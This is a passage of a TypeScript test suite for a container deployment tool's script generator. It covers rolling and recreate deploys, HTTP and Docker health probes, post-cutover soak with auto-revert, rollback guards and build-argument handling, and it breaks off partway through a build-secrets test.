      // happy path (2xx/3xx) still renames the gated rollout into place
      expect(s).toContain("docker rename tugra_abc__rollout tugra_abc");
    });

    it("non-httpExternal (stableWait) rolling probe emits no >=400 relabel branch (no $code available)", () => {
      const s = buildRollingDeployScript(domained, "v2", { probe: { kind: "stableWait" }, ...gate });
      expect(s).not.toContain('"$code" -ge 400');
    });

    it("a hard-cutover (non-rolling) deploy carries NO LB health check (no regression)", () => {
      const s = buildRunScript(domained, "v1");
      expect(s).not.toContain("loadbalancer.healthcheck");
    });

    it("on health-pass removes the OLD container and renames the new one in (exit 0)", () => {
      const s = buildRollingDeployScript(domained, "v2", { probe: { kind: "httpExternal", port: 80, path: "/" }, ...gate });
      expect(s).toContain('if [ "$healthy" = 1 ]; then');
      expect(s).toContain("docker rm -f tugra_abc 2>/dev/null || true");
      expect(s).toContain("docker rename tugra_abc__rollout tugra_abc");
      expect(s).toContain('echo "TUGRA_ROLLOUT: healthy"; exit 0');
    });

    it("on health-fail removes the NEW container, keeps the old one, and exits 3", () => {
      const s = buildRollingDeployScript(domained, "v2", { probe: { kind: "httpExternal", port: 80, path: "/" }, ...gate });
      expect(s).toContain("docker rm -f tugra_abc__rollout 2>/dev/null || true");
      expect(s).toContain('echo "TUGRA_ROLLOUT: rolled_back"; exit 3');
      // the health gate runs under set +e so a failed probe doesn't abort the swap logic
      expect(s).toContain("set +e");
    });

    it("build=false (rollback) skips the build/pull prep", () => {
      const s = buildRollingDeployScript(domained, "old1", { build: false, probe: { kind: "stableWait" }, ...gate });
      expect(s).not.toContain("docker pull");
      expect(s).not.toContain("docker tag");
      expect(s).toContain("docker run -d --name tugra_abc__rollout");
    });

    it("httpExternal probe hits the pinned probe image over the proxy network", () => {
      const s = buildRollingDeployScript(domained, "v2", { probe: { kind: "httpExternal", port: 3000, path: "/healthz" }, ...gate });
      expect(s).toContain(
        `docker run --rm --network tugra-proxy ${HEALTH_PROBE_IMAGE} -s -o /dev/null -w '%{http_code}' --max-time 5 'http://tugra_abc__rollout:3000/healthz'`,
      );
      // any HTTP response < 500 = reachable/serving (booted apps 404/401 on the probe path)
      expect(s).toContain(`if [ "$code" != "000" ] && [ "$code" -lt 500 ]; then healthy=1; break; fi`);
      expect(s).toContain(`for i in $(seq 1 ${gate.retries}); do`);
      expect(s).toContain(`sleep ${gate.startPeriodSec}`);
    });

    it("native probe polls docker's container health status", () => {
      const s = buildRollingDeployScript({ ...domained, healthCmd: "curl -f http://localhost/ || exit 1" }, "v2", {
        probe: { kind: "native" },
        ...gate,
      });
      expect(s).toContain("docker inspect --format '{{json .State.Health.Status}}' tugra_abc__rollout");
      expect(s).toContain("--health-cmd 'curl -f http://localhost/ || exit 1'"); // container carries the health-cmd
    });

    it("resolveHealthCheckType truth table (explicit type wins; else healthCmd -> CMD, domain -> HTTP, else NONE)", () => {
      expect(resolveHealthCheckType({})).toBe("NONE");
      expect(resolveHealthCheckType({ healthCmd: "x" })).toBe("CMD");
      expect(resolveHealthCheckType({ domain: "a.com" })).toBe("HTTP");
      expect(resolveHealthCheckType({ healthCmd: "x", domain: "a.com" })).toBe("CMD");
      expect(resolveHealthCheckType({ healthCheckType: "NONE", healthCmd: "x", domain: "a.com" })).toBe("NONE");
      expect(resolveHealthCheckType({ healthCheckType: "HTTP", healthCmd: "x" })).toBe("HTTP");
      expect(resolveHealthCheckType({ healthCheckType: "CMD" })).toBe("CMD");
      expect(resolveHealthCheckType({ healthCheckType: null, healthCmd: null, domain: null })).toBe("NONE");
    });

    it("resolveHealthProbe auto (type unset): healthCmd→native, domain→httpExternal, else stableWait", () => {
      expect(resolveHealthProbe({ ...base, healthCmd: "x" })).toEqual({ kind: "native" });
      expect(resolveHealthProbe({ ...base, domain: "x.com", containerPort: 3000 })).toEqual({
        kind: "httpExternal",
        port: 3000,
        path: "/",
        expectedStatus: null,
        timeoutSec: 5,
        method: null,
        scheme: null,
        responseText: null,
      });
      expect(resolveHealthProbe(base)).toEqual({ kind: "stableWait" });
    });

    it("resolveHealthProbe honours explicit type/path/port config", () => {
      // explicit CMD → native (even without auto-derivation)
      expect(resolveHealthProbe({ ...base, healthCheckType: "CMD", healthCmd: "x" })).toEqual({ kind: "native" });
      // explicit NONE overrides an auto-HTTP domain app → liveness only
      expect(resolveHealthProbe({ ...base, domain: "x.com", healthCheckType: "NONE" })).toEqual({ kind: "stableWait" });
      // HTTP with custom path + port on a routed app (proxy network, container name)
      expect(resolveHealthProbe({ ...base, domain: "x.com", healthCheckType: "HTTP", healthCheckPath: "/up", healthCheckPort: 9000 })).toEqual({
        kind: "httpExternal",
        port: 9000,
        path: "/up",
        expectedStatus: null,
        timeoutSec: 5,
        method: null,
        scheme: null,
        responseText: null,
      });
      // HTTP on a host-port app probes localhost over the host network, pinned to the app's
      // OWN published port — a custom healthCheckPort is IGNORED so it can't scan other ports
      expect(resolveHealthProbe({ ...base, hostPort: 8080, healthCheckType: "HTTP", healthCheckPath: "/health", healthCheckPort: 9999 })).toEqual({
        kind: "httpExternal",
        port: 8080,
        path: "/health",
        onHost: true,
        expectedStatus: null,
        timeoutSec: 5,
        method: null,
        scheme: null,
        responseText: null,
      });
      // HTTP configured but nothing reachable (no domain, no host port) → liveness wait
      expect(resolveHealthProbe({ ...base, healthCheckType: "HTTP" })).toEqual({ kind: "stableWait" });
    });

    it("a host-port HTTP probe uses the host network + localhost (not the proxy), single-quoted URL", () => {
      const s = buildHealthGateFragment("tugra_abc", { kind: "httpExternal", port: 8080, path: "/health", onHost: true }, gate);
      const joined = s.join("\n");
      expect(joined).toContain(`docker run --rm --network host ${HEALTH_PROBE_IMAGE} -s -o /dev/null -w '%{http_code}' --max-time 5 'http://localhost:8080/health'`);
      expect(joined).not.toContain("tugra-proxy");
    });

    it("scheme=https probes over TLS with -k and an https:// URL", () => {
      const joined = buildHealthGateFragment("tugra_abc", { kind: "httpExternal", port: 8443, path: "/health", scheme: "https" }, gate).join("\n");
      expect(joined).toContain(`${HEALTH_PROBE_IMAGE} -k -s -o /dev/null -w '%{http_code}' --max-time 5 'https://tugra_abc:8443/health'`);
    });

    it("scheme http/null and method GET/null stay plain (no -k, no -X, http:// URL)", () => {
      for (const probe of [
        { kind: "httpExternal", port: 80, path: "/" },
        { kind: "httpExternal", port: 80, path: "/", scheme: "http", method: "GET" },
      ] as const) {
        const joined = buildHealthGateFragment("tugra_abc", probe, gate).join("\n");
        expect(joined).toContain(`${HEALTH_PROBE_IMAGE} -s -o /dev/null -w '%{http_code}' --max-time 5 'http://tugra_abc:80/'`);
        expect(joined).not.toContain("-k ");
        expect(joined).not.toContain("-X ");
      }
    });

    it("a non-GET method is passed as -X; https+POST combine (order: method then -k)", () => {
      const joined = buildHealthGateFragment("tugra_abc", { kind: "httpExternal", port: 8443, path: "/live", method: "POST", scheme: "https" }, gate).join("\n");
      expect(joined).toContain(`${HEALTH_PROBE_IMAGE} -X POST -k -s -o /dev/null -w '%{http_code}' --max-time 5 'https://tugra_abc:8443/live'`);
    });

    it("HEAD uses -I/--head, never `-X HEAD` (which stalls curl waiting for an absent body and fails the gate)", () => {
      const joined = buildHealthGateFragment("tugra_abc", { kind: "httpExternal", port: 80, path: "/", method: "HEAD" }, gate).join("\n");
      expect(joined).toContain(`${HEALTH_PROBE_IMAGE} -I -s -o /dev/null -w '%{http_code}' --max-time 5 'http://tugra_abc:80/'`);
      expect(joined).not.toContain("-X HEAD");
    });

    it("responseText ANDs a body-grep onto the status check (grep -qF, single-quoted, status capture unchanged)", () => {
      const joined = buildHealthGateFragment("tugra_abc", { kind: "httpExternal", port: 80, path: "/", responseText: "OK healthy" }, gate).join("\n");
      // status line still byte-for-byte the status-only form (the body check is a second curl)
      expect(joined).toContain(`code=$(docker run --rm --network tugra-proxy ${HEALTH_PROBE_IMAGE} -s -o /dev/null -w '%{http_code}' --max-time 5 'http://tugra_abc:80/' 2>/dev/null || echo 000)`);
      // second curl fetches the body and greps for the literal needle, ANDed onto the status pass
      expect(joined).toContain(`&& docker run --rm --network tugra-proxy ${HEALTH_PROBE_IMAGE} -s --max-time 5 'http://tugra_abc:80/' 2>/dev/null | grep -qF -- 'OK healthy'`);
    });

    it("no responseText → no body-grep second curl (status-only, unchanged)", () => {
      const joined = buildHealthGateFragment("tugra_abc", { kind: "httpExternal", port: 80, path: "/" }, gate).join("\n");
      expect(joined).not.toContain("grep -qF");
    });

    it("a response needle with a single quote is safely shell-quoted (no injection)", () => {
      const joined = buildHealthGateFragment("tugra_abc", { kind: "httpExternal", port: 80, path: "/", responseText: "it's up" }, gate).join("\n");
      expect(joined).toContain(`grep -qF -- 'it'\\''s up'`);
    });

    it("the body probe is always a plain GET — never the status method (HEAD/POST would mis-read or double-fire)", () => {
      // HEAD status: status capture uses -I, but the body probe is a GET (no -I) so it reads a real body.
      const head = buildHealthGateFragment("tugra_abc", { kind: "httpExternal", port: 80, path: "/", method: "HEAD", responseText: "ok" }, gate).join("\n");
      expect(head).toContain(`-I -s -o /dev/null -w '%{http_code}'`); // status still HEAD
      expect(head).toContain(`&& docker run --rm --network tugra-proxy ${HEALTH_PROBE_IMAGE} -s --max-time 5 'http://tugra_abc:80/' 2>/dev/null | grep -qF -- 'ok'`); // body probe is GET
      // POST status: body probe does NOT repeat the POST.
      const post = buildHealthGateFragment("tugra_abc", { kind: "httpExternal", port: 80, path: "/", method: "POST", responseText: "ok" }, gate).join("\n");
      expect(post).toContain(`-X POST -s -o /dev/null -w '%{http_code}'`); // status still POST
      const bodyLine = post.split("\n").find((l) => l.includes("grep -qF"))!;
      expect(bodyLine).not.toContain("-X POST"); // body probe is a GET, not a second POST
      // https is still honoured on the body probe.
      const https = buildHealthGateFragment("tugra_abc", { kind: "httpExternal", port: 8443, path: "/", scheme: "https", responseText: "ok" }, gate).join("\n");
      expect(https).toContain(`&& docker run --rm --network tugra-proxy ${HEALTH_PROBE_IMAGE} -k -s --max-time 5 'https://tugra_abc:8443/' 2>/dev/null | grep -qF -- 'ok'`);
    });

    it("resolveHealthGate uses rolling defaults, overridden per app", () => {
      expect(resolveHealthGate(base)).toEqual({ retries: 20, intervalSec: 3, startPeriodSec: 5 });
      expect(resolveHealthGate({ ...base, healthRetries: 40, healthInterval: 6, healthStartPeriod: 90 })).toEqual({ retries: 40, intervalSec: 6, startPeriodSec: 90 });
    });

    it("HTTP probe: default passes any code < 500; an expectedStatus requires exactly that code; timeout is tunable", () => {
      const def = buildHealthGateFragment("t", { kind: "httpExternal", port: 80, path: "/" }, gate).join("\n");
      expect(def).toContain(`[ "$code" != "000" ] && [ "$code" -lt 500 ]`);
      const exact = buildHealthGateFragment("t", { kind: "httpExternal", port: 80, path: "/", expectedStatus: 200, timeoutSec: 20 }, gate).join("\n");
      expect(exact).toContain(`[ "$code" = "200" ]`);
      expect(exact).toContain("--max-time 20");
      expect(exact).not.toContain("-lt 500");
    });

    it("docker --health-* flags use per-app timings, else defaults", () => {
      const def = buildRunScript({ ...base, healthCmd: "curl -f localhost/health" }, "v1", false);
      expect(def).toContain("--health-interval=10s");
      expect(def).toContain("--health-start-period=30s");
      const tuned = buildRunScript({ ...base, healthCmd: "curl -f localhost/health", healthInterval: 20, healthTimeout: 8, healthRetries: 5, healthStartPeriod: 120 }, "v1", false);
      expect(tuned).toContain("--health-interval=20s");
      expect(tuned).toContain("--health-timeout=8s");
      expect(tuned).toContain("--health-retries=5");
      expect(tuned).toContain("--health-start-period=120s");
    });
  });

  describe("post-cutover soak + auto-revert (rolling path)", () => {
    const domained: AppSpec = { ...base, domain: "app.example.com" };
    const gate = { retries: 10, intervalSec: 3, startPeriodSec: 5 };
    const httpProbe = { kind: "httpExternal", port: 80, path: "/" } as const;

    it("prevName is <container>__prev (clear of the __rollout / badge match)", () => {
      expect(prevName({ id: "abc" })).toBe("tugra_abc__prev");
    });

    it("resolveSoak maps postCutoverSoakSec→window (0/null/undefined = off), interval reuses the gate interval", () => {
      expect(resolveSoak(base)).toEqual({ windowSec: 0, intervalSec: 3 });
      expect(resolveSoak({ ...base, postCutoverSoakSec: 0 })).toEqual({ windowSec: 0, intervalSec: 3 });
      expect(resolveSoak({ ...base, postCutoverSoakSec: null })).toEqual({ windowSec: 0, intervalSec: 3 });
      expect(resolveSoak({ ...base, postCutoverSoakSec: 60 })).toEqual({ windowSec: 60, intervalSec: 3 });
      expect(resolveSoak({ ...base, postCutoverSoakSec: 60, healthInterval: 5 })).toEqual({ windowSec: 60, intervalSec: 5 });
    });

    it("soakRetries = floor(window/interval), ≥1; a window < interval*THRESHOLD watches but cannot trip", () => {
      expect(soakRetries({ windowSec: 60, intervalSec: 5 })).toBe(12);
      expect(soakRetries({ windowSec: 7, intervalSec: 5 })).toBe(1); // floor(7/5)=1
      // window < interval*threshold → retries < threshold → `fails` can never reach the trip count
      const retries = soakRetries({ windowSec: 5, intervalSec: 5 });
      expect(retries).toBeLessThan(SOAK_FAIL_THRESHOLD); // 1 < 3 → watch-only
    });

    it("soak OFF (default) emits the BYTE-IDENTICAL pre-soak success block — no __prev / revert / exit 4", () => {
      const noSoak = buildRollingDeployScript(domained, "v2", { probe: httpProbe, ...gate });
      const explicitZero = buildRollingDeployScript(domained, "v2", { probe: httpProbe, soak: { windowSec: 0, intervalSec: 3 }, ...gate });
      // off by omission and off by an explicit 0 window both produce exactly today's script
      expect(explicitZero).toBe(noSoak);
      // today's happy-path cutover (destroy old, rename new in, exit 0) is intact
      expect(noSoak).toContain("docker rm -f tugra_abc 2>/dev/null || true");
      expect(noSoak).toContain("docker rename tugra_abc__rollout tugra_abc");
      expect(noSoak).toContain('echo "TUGRA_ROLLOUT: healthy"; exit 0');
      // and NONE of the soak machinery leaked in
      expect(noSoak).not.toContain("__prev");
      expect(noSoak).not.toContain("TUGRA_ROLLOUT: reverted");
      expect(noSoak).not.toContain("exit 4");
      expect(noSoak).not.toContain("soak_ok");
    });

    it("soak ON retains the OLD container as __prev (graceful stop + rename), not a destroy, at cutover", () => {
      const s = buildRollingDeployScript(domained, "v2", { probe: httpProbe, soak: { windowSec: 60, intervalSec: 5 }, ...gate });
      // leading stale-clear of any __prev orphaned by a prior interrupted soak
      expect(s).toContain("docker rm -f tugra_abc__prev 2>/dev/null || true");
      // graceful stop (SIGTERM, clean) then rename-to-__prev — the old is KEPT, not `docker rm -f`'d
      expect(s).toContain("docker stop tugra_abc 2>/dev/null || true");
      expect(s).toContain("docker rename tugra_abc tugra_abc__prev 2>/dev/null || true");
      // order: stop BEFORE the rename-to-prev
      expect(s.indexOf("docker stop tugra_abc 2>/dev/null")).toBeLessThan(s.indexOf("docker rename tugra_abc tugra_abc__prev"));
      // the cutover itself still renames the rollout into the canonical name, but now WITHOUT an exit 0
      expect(s).toContain("if docker rename tugra_abc__rollout tugra_abc; then :;");
    });

    it("soak ON re-probes the NEW canonical container (not __rollout) over the proxy, looping soakRetries, resetting on a pass", () => {
      const s = buildRollingDeployScript(domained, "v2", { probe: { kind: "httpExternal", port: 3000, path: "/healthz" }, soak: { windowSec: 60, intervalSec: 5 }, ...gate });
      // the soak probe targets the post-rename canonical name, NOT the rollout the gate probed
      expect(s).toContain(`docker run --rm --network tugra-proxy ${HEALTH_PROBE_IMAGE} -s -o /dev/null -w '%{http_code}' --max-time 5 'http://tugra_abc:3000/healthz'`);
      // soak loop count = floor(60/5) = 12
      expect(s).toContain("for i in $(seq 1 12); do");
      // sustained-only: reset the consecutive-fail counter on any passing probe, trip at the threshold
      expect(s).toContain("if [ \"$probe_ok\" = 1 ]; then fails=0; else fails=$((fails+1)); if [ \"$fails\" -ge 3 ]; then soak_ok=0; break; fi; fi");
      expect(s).toContain("soak_ok=1");
    });

    it("soak ON, survived the window → GC __prev and succeed (exit 0)", () => {
      const s = buildRollingDeployScript(domained, "v2", { probe: httpProbe, soak: { windowSec: 60, intervalSec: 5 }, ...gate });
      expect(s).toContain('if [ "$soak_ok" = 1 ]; then');
      // GC the retained previous generation, then succeed
      const gc = s.slice(s.indexOf('if [ "$soak_ok" = 1 ]; then'));
      expect(gc).toContain("docker rm -f tugra_abc__prev 2>/dev/null || true");
      expect(gc).toContain('echo "TUGRA_ROLLOUT: healthy"; exit 0');
    });

    it("soak ON, sustained failure → auto-revert to __prev (remove new, rename+start prev) with the exit-4 marker", () => {
      const s = buildRollingDeployScript(domained, "v2", { probe: httpProbe, soak: { windowSec: 60, intervalSec: 5 }, ...gate });
      const revert = s.slice(s.indexOf("else", s.indexOf('if [ "$soak_ok" = 1 ]; then')));
      // remove the broken NEW before bringing the old back (never round-robin onto the broken copy)
      expect(revert).toContain("docker stop tugra_abc 2>/dev/null || true");
      expect(revert).toContain("docker rm -f tugra_abc 2>/dev/null || true");
      // bring __prev back live; a docker start re-registers it with the proxy's docker provider
      expect(revert).toContain("if docker rename tugra_abc__prev tugra_abc && docker start tugra_abc; then");
      // distinct post-cutover marker + exit 4 (vs the pre-cutover exit 3), and an honest hard-fail arm
      expect(revert).toContain('echo "TUGRA_ROLLOUT: reverted"; exit 4');
      expect(revert).toContain('echo "TUGRA_ROLLOUT: revert_failed"; exit 1');
    });

    it("soak ON, sustained failure but NO __prev to revert to (first-ever deploy) → keeps the new, exit 0 (never app-down)", () => {
      const s = buildRollingDeployScript(domained, "v2", { probe: httpProbe, soak: { windowSec: 60, intervalSec: 5 }, ...gate });
      const revert = s.slice(s.indexOf("else", s.indexOf('if [ "$soak_ok" = 1 ]; then')));
      // the revert is guarded on actually HAVING a previous generation
      expect(revert).toContain("if docker inspect tugra_abc__prev >/dev/null 2>&1; then");
      // no __prev (e.g. a first-ever deploy): KEEP the gate-passed new running rather than remove it with
      // nothing to fall back to — a distinct marker + exit 0 (app stays up, same as today's no-soak outcome)
      expect(revert).toContain('echo "TUGRA_ROLLOUT: soak_failed_no_prev"; exit 0');
    });

    it("soak ON emits the first-deploy guard: had_prev recorded after the __prev rename, the watch only runs when it is 1", () => {
      const s = buildRollingDeployScript(domained, "v2", { probe: httpProbe, soak: { windowSec: 30, intervalSec: 3 }, ...gate });
      const renameIdx = s.indexOf("docker rename tugra_abc tugra_abc__prev 2>/dev/null || true");
      const guardIdx = s.indexOf("had_prev=0; docker inspect tugra_abc__prev >/dev/null 2>&1 && had_prev=1");
      expect(renameIdx).toBeGreaterThan(-1);
      expect(guardIdx).toBeGreaterThan(renameIdx);
      const ifIdx = s.indexOf('if [ "$had_prev" = 1 ]; then');
      const echoIdx = s.indexOf("TUGRA: post-cutover soak: watching the new version for 30s; reverting automatically after 3 consecutive failed checks");
      const loopIdx = s.indexOf("for i in $(seq 1 10); do", echoIdx);
      const elseIdx = s.indexOf("else soak_ok=1; fi");
      // the cutover runs between the guard and the watch; echo then loop sit inside the had_prev branch
      expect(s.indexOf("if docker rename tugra_abc__rollout tugra_abc; then :;")).toBeGreaterThan(guardIdx);
      expect(ifIdx).toBeGreaterThan(s.indexOf("if docker rename tugra_abc__rollout tugra_abc; then :;"));
      expect(echoIdx).toBeGreaterThan(ifIdx);
      expect(loopIdx).toBeGreaterThan(echoIdx);
      expect(elseIdx).toBeGreaterThan(loopIdx);
      // the defensive no-prev arm is kept and the markers are unchanged
      expect(s).toContain('echo "TUGRA_ROLLOUT: soak_failed_no_prev"; exit 0');
      for (const m of ["TUGRA_ROLLOUT: healthy", "TUGRA_ROLLOUT: reverted", "TUGRA_ROLLOUT: revert_failed"]) expect(s).toContain(m);
    });

    it("soak OFF scripts carry none of the first-deploy guard (byte-identical contract)", () => {
      const off = buildRollingDeployScript(domained, "v2", { probe: httpProbe, ...gate });
      expect(off).not.toContain("had_prev");
      expect(off).not.toContain("post-cutover soak");
    });

    it("soak ON keeps the PRE-cutover gate-fail behaviour (old untouched, exit 3) unchanged", () => {
      const s = buildRollingDeployScript(domained, "v2", { probe: httpProbe, soak: { windowSec: 60, intervalSec: 5 }, ...gate });
      // the else arm of the health gate still drops the rollout and keeps the old container → exit 3
      expect(s).toContain("docker rm -f tugra_abc__rollout 2>/dev/null || true");
      expect(s).toContain('echo "TUGRA_ROLLOUT: rolled_back"; exit 3');
    });

    it("soak ON + gate-accepted >=400 (relabel): the recreated canonical is the soak target, NOT an early exit 0", () => {
      const s = buildRollingDeployScript(domained, "v2", { probe: httpProbe, soak: { windowSec: 60, intervalSec: 5 }, ...gate });
      // the relabel arm recreates canonical WITHOUT the LB-check label, then falls THROUGH to the soak (`:`),
      // never the no-soak arm's `echo "TUGRA_ROLLOUT: healthy"; exit 0`
      expect(s).toContain('if [ "$code" -ge 400 ]; then');
      const live = s.split("\n").find((l) => l.includes("docker run -d --name tugra_abc ") && !l.includes("__rollout"))!;
      expect(live).toBeDefined();
      expect(live).not.toContain("loadbalancer.healthcheck");
      // relabel arm does NOT short-circuit to exit 0; it continues into the soak watch
      expect(s).toContain('if docker run -d --name tugra_abc');
      expect(s).not.toContain('echo "TUGRA_ROLLOUT: healthy"; exit 0\n  fi'); // (the relabel arm never exits 0 inline)
      // the soak machinery is still reached after the relabel cutover
      expect(s).toContain("soak_ok=1");
      expect(s).toContain('echo "TUGRA_ROLLOUT: reverted"; exit 4');
    });

    it("soak ON with a native (container health-cmd) probe soaks the canonical's docker health status", () => {
      const s = buildRollingDeployScript({ ...domained, healthCmd: "curl -f http://localhost/ || exit 1" }, "v2", {
        probe: { kind: "native" },
        soak: { windowSec: 30, intervalSec: 5 },
        ...gate,
      });
      // gate probes the rollout; soak probes the canonical — both via docker inspect health status
      expect(s).toContain("docker inspect --format '{{json .State.Health.Status}}' tugra_abc__rollout");
      expect(s).toContain("docker inspect --format '{{json .State.Health.Status}}' tugra_abc 2>/dev/null");
      expect(s).toContain('echo "TUGRA_ROLLOUT: reverted"; exit 4');
    });

    it("buildSoakWatchFragment: sustained-failure loop shape (reset-on-pass, trip at THRESHOLD, one decision)", () => {
      const frag = buildSoakWatchFragment("tugra_abc", httpProbe, { windowSec: 30, intervalSec: 5 }).join("\n");
      expect(frag).toContain("soak_ok=1");
      expect(frag).toContain("fails=0");
      expect(frag).toContain("for i in $(seq 1 6); do"); // floor(30/5)=6
      expect(frag).toContain("sleep 5");
      expect(frag).toContain("if [ \"$probe_ok\" = 1 ]; then fails=0; else fails=$((fails+1)); if [ \"$fails\" -ge 3 ]; then soak_ok=0; break; fi; fi");
    });
  });

  describe("recreate deploy", () => {
    const hostPortApp: AppSpec = { ...base, hostPort: 8080, containerPort: 80 };
    const gate = { retries: 10, intervalSec: 3, startPeriodSec: 5 };

    it("recreates on the canonical name (NO rollout temp container)", () => {
      const s = buildRecreateDeployScript(hostPortApp, "v2", { prevVersion: "v1", probe: { kind: "stableWait" }, ...gate });
      // stop old, start new under the SAME canonical name — no __rollout overlap container
      expect(s).toContain("docker rm -f tugra_abc 2>/dev/null || true");
      expect(s).toContain("docker run -d --name tugra_abc");
      expect(s).not.toContain("__rollout");
      // host-port app publishes its port
      expect(s).toContain("-p 8080:80");
    });

    it("guards the new container's START so a docker-run failure falls through to rollback (not a set -e abort)", () => {
      const s = buildRecreateDeployScript(hostPortApp, "v2", { prevVersion: "prevdep", probe: { kind: "stableWait" }, ...gate });
      // set +e is raised BEFORE the run, and the run itself is guarded by `if` so a daemon
      // rejection (port clash, bad flag) doesn't abort the script before the rollback branch
      const setPlusE = s.indexOf("set +e");
      const run = s.indexOf("if docker run -d --name tugra_abc");
      expect(setPlusE).toBeGreaterThan(-1);
      expect(run).toBeGreaterThan(setPlusE); // guarded run comes after set +e
      expect(s).toContain("  healthy=0"); // start-failed → treated as unhealthy → rollback
    });

    it("on health-pass just keeps the new container (exit 0)", () => {
      const s = buildRecreateDeployScript(hostPortApp, "v2", { prevVersion: "v1", probe: { kind: "stableWait" }, ...gate });
      expect(s).toContain('if [ "$healthy" = 1 ]; then');
      expect(s).toContain('echo "TUGRA_ROLLOUT: healthy"; exit 0');
      // the gate runs under set +e so a failed probe doesn't abort the rollback logic
      expect(s).toContain("set +e");
    });

    it("on health-fail with a previous version: removes the new, re-runs the old image, exit 3", () => {
      const s = buildRecreateDeployScript(hostPortApp, "v2", { prevVersion: "prevdep", probe: { kind: "stableWait" }, ...gate });
      // drop the unhealthy new container, then re-run the retained previous image under canonical
      expect(s).toContain("docker rm -f tugra_abc 2>/dev/null || true");
      expect(s).toContain("docker run -d --name tugra_abc");
      expect(s).toContain("tugra_abc:prevdep"); // the previous image ref is re-run
      expect(s).toContain('echo "TUGRA_ROLLOUT: rolled_back"; exit 3');
      // a rollback re-run that itself fails is an honest failure, not a fake "kept previous"
      expect(s).toContain('echo "TUGRA_ROLLOUT: rollback_failed"; exit 1');
    });

    it("on health-fail with NO previous version: hard failure (exit 1, no rollback re-run)", () => {
      const s = buildRecreateDeployScript(hostPortApp, "v2", { prevVersion: null, probe: { kind: "stableWait" }, ...gate });
      expect(s).toContain('echo "TUGRA_ROLLOUT: failed"; exit 1');
      expect(s).not.toContain("TUGRA_ROLLOUT: rolled_back");
      // the new image (tugra_abc:v2) is built, but there is exactly ONE `docker run` (the new
      // container) — no second run re-launching a previous image
      expect(s.match(/docker run -d --name tugra_abc/g)?.length).toBe(1);
    });

    it("build=false skips the build/pull prep", () => {
      const s = buildRecreateDeployScript(hostPortApp, "old1", { build: false, prevVersion: "v1", probe: { kind: "stableWait" }, ...gate });
      expect(s).not.toContain("docker pull");
      expect(s).not.toContain("docker tag");
      expect(s).toContain("docker run -d --name tugra_abc");
    });

    it("a domain app forced to recreate (e.g. a named volume) still uses the httpExternal probe", () => {
      const volApp: AppSpec = { ...base, domain: "app.example.com", containerPort: 3000 };
      const s = buildRecreateDeployScript(volApp, "v2", {
        prevVersion: "v1",
        probe: { kind: "httpExternal", port: 3000, path: "/healthz" },
        ...gate,
      });
      expect(s).toContain(
        `docker run --rm --network tugra-proxy ${HEALTH_PROBE_IMAGE} -s -o /dev/null -w '%{http_code}' --max-time 5 'http://tugra_abc:3000/healthz'`,
      );
    });
  });

  it("IMAGE: pulls, snapshots to the versioned tag, removes old, runs the version", () => {
    const s = buildRunScript(base, "v1");
    expect(s).toContain("docker pull -q 'nginx:1.27'");
    expect(s).toContain("docker tag 'nginx:1.27' tugra_abc:v1");
    expect(s).toContain("docker rm -f tugra_abc");
    expect(s).toContain("docker run -d --name tugra_abc --restart unless-stopped --log-driver json-file --log-opt max-size=10m --log-opt max-file=3 --network tugra-apps 'tugra_abc:v1'");
  });

  it("rollback (build=false): no prep, just runs the existing versioned tag", () => {
    const s = buildRunScript(base, "old1", false);
    expect(s).not.toContain("docker pull");
    expect(s).not.toContain("docker tag");
    expect(s).not.toContain("git clone");
    expect(s).toContain("docker run -d --name tugra_abc --restart unless-stopped --log-driver json-file --log-opt max-size=10m --log-opt max-file=3 --network tugra-apps 'tugra_abc:old1'");
  });

  it("rollback (build=false): refuses (exit 7) if the local image is gone, BEFORE removing the live container", () => {
    const s = buildRunScript(base, "old1", false);
    expect(s).toContain("docker image inspect tugra_abc:old1");
    expect(s).toContain("exit 7");
    // the guard must come before the destructive `docker rm -f`, else the live container is already gone
    expect(s.indexOf("docker image inspect tugra_abc:old1")).toBeLessThan(s.indexOf("docker rm -f tugra_abc"));
  });

  it("deploy (build=true): no image-existence guard — the image is built/pulled in-script", () => {
    expect(buildRunScript(base, "v1", true)).not.toContain("docker image inspect");
  });

  it("force deploy (noCache) adds --no-cache to Dockerfile builds only when requested", () => {
    const git: AppSpec = { ...base, source: "GIT", gitUrl: "https://x/y.git", buildType: "DOCKERFILE" };
    const forced = buildRunScript(git, "v1", true, true);
    expect(forced).toContain("docker build --no-cache -t tugra_abc:v1");
    const normal = buildRunScript(git, "v1", true, false);
    expect(normal).toContain("docker build -t tugra_abc:v1");
    expect(normal).not.toContain("--no-cache");
  });

  it("RAILPACK: installs railpack and builds to the versioned tag", () => {
    const s = buildRunScript({ ...base, source: "GIT", gitUrl: "https://x/y.git", buildType: "RAILPACK" }, "v1");
    expect(s).toContain("command -v railpack");
    expect(s).toContain("railpack build /etc/tugra/builds/abc --name tugra_abc:v1");
  });

  it("HEROKU: builds via the pack CLI with the heroku builder", () => {
    const s = buildRunScript({ ...base, source: "GIT", gitUrl: "https://x/y.git", buildType: "HEROKU" }, "v1");
    expect(s).toContain("command -v pack");
    expect(s).toContain("pack build tugra_abc:v1 --path /etc/tugra/builds/abc --builder heroku/builder:24");
  });

  it("injects build args as --build-arg (docker) and --env (buildpacks)", () => {
    const git = { ...base, source: "GIT" as const, gitUrl: "https://x/y.git", buildArgs: { API_URL: "https://api.x" } };
    const dockerfile = buildRunScript({ ...git, buildType: "DOCKERFILE" }, "v1");
    expect(dockerfile).toContain("--build-arg 'API_URL=https://api.x'");
    const nixpacks = buildRunScript({ ...git, buildType: "NIXPACKS" }, "v1");
    // --env flags reach BOTH the plan and the build step
    expect(nixpacks).toContain("nixpacks plan -f json --env 'API_URL=https://api.x' /etc/tugra/builds/abc > /etc/tugra/builds/abc.plan.json");
    expect(nixpacks).toContain("nixpacks build -c /etc/tugra/builds/abc.plan.json --cache-key 'abc' --name tugra_abc:v1 --env 'API_URL=https://api.x' /etc/tugra/builds/abc");
    const railpack = buildRunScript({ ...git, buildType: "RAILPACK" }, "v1");
    expect(railpack).toContain("--env 'API_URL=https://api.x'");
  });

  it("build SECRETS: Dockerfile builds mount each as a BuildKit secret from a 0600 file in the wiped secrets dir — the value never appears in the command, the image gets no --build-arg for it", () => {
    const git = { ...base, source: "GIT" as const, gitUrl: "https://x/y.git", buildType: "DOCKERFILE" as const, buildSecrets: { NPM_TOKEN: "npm_s3cr3t", "bad-key": "x" } };
    const s = buildRunScript(git, "v1");
    expect(s).toContain("DOCKER_BUILDKIT=1 docker build ");
    expect(s).toContain('--secret id=NPM_TOKEN,src="$sd/bs_NPM_TOKEN" ');
